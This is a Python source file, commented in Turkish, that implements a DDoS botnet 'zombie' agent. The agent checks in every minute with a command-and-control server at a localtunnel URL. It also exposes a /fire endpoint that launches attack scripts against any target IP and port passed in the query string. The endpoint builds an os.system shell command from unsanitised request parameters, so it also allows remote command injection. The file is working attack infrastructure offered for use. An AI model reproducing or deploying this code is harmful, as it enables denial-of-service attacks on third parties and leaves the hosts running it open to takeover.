import os
import subprocess
import sys

# --- OTOMATİK KÜTÜPHANE KONTROLÜ VE KURULUMU ---
def install_requirements():
    requirements = ['flask', 'requests']
    for lib in requirements:
        try:
            __import__(lib)
        except ImportError:
            print(f"📦 {lib} eksik, kuruluyor...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

# Kütüphaneleri kontrol et ve eksikleri kur
install_requirements()

# Kurulum bittikten sonra asıl kütüphaneleri içe aktar
from flask import Flask, request
import requests
import time
import threading

app = Flask(__name__)

# --- KRİTİK AYARLAR ---
# Localtunnel'dan aldığın güncel link
BEYIN_URL = "https://shy-otters-trade.loca.lt" 
ZOMBI_PORT = "5000"

def kayit_ol():
    """Beyin'e (Cloud Shell) 'BURADAYIM' der."""
    while True:
        try:
            headers = {"Bypass-Tunnel-Reminder": "true"}
            response = requests.get(f"{BEYIN_URL}/kayit?port={ZOMBI_PORT}", headers=headers, timeout=15)
            if response.status_code == 200:
                print("✅ Beyin'e kayıt başarılı!")
            else:
                print(f"⚠️ Beyin cevap verdi ama hata: {response.status_code}")
        except Exception as e:
            print(f"❌ Beyin'e ulaşılamıyor: {e}")
        time.sleep(60)

@app.route('/fire')
def fire():
    """Saldırı emrini icra eder."""
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    method = request.args.get('method')
    
    if method:
        print(f"🚀 Saldırı emri alındı: {method} -> {target}:{port}")
        # nohup ile arka planda çalıştır ki bağlantı kopsa da devam etsin
        os.system(f"nohup python3 {method}.py {target} {port} {sure} > /dev/null 2>&1 &")
        return f"Saldırı başlatıldı: {method}", 200
    return "Method eksik!", 400

@app.route('/ping')
def ping():
    return "PONG", 200

if __name__ == '__main__':
    # Kayıt döngüsünü arka planda başlat
    threading.Thread(target=kayit_ol, daemon=True).start()
    
    print(f"⚡ ZOMBI AKTIF! Port {ZOMBI_PORT} üzerinden emir bekliyor...")
    app.run(host='0.0.0.0', port=int(ZOMBI_PORT))
